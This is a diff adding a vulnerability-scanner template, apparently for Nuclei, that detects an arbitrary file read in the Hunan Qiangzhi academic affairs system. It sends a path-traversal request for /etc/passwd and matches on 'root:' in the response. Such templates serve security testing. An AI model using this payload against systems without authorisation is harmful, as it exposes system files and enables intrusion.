@@ -1,0 +1,24 @@
+id: poc-yaml-qzdatasoft-jiaowuyitihua-system-anyfile-read
+info:
+  name: 湖南强智教务一体化系统存在任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: file-read
+  description: |
+    湖南强智教务一体化系统存在任意文件读取漏洞，通过特定的URL构造，可以读取任意文件，例如 /etc/passwd。
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/sealimage.zz?imgtype=*/*&imgpath=../../../../../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/sh"
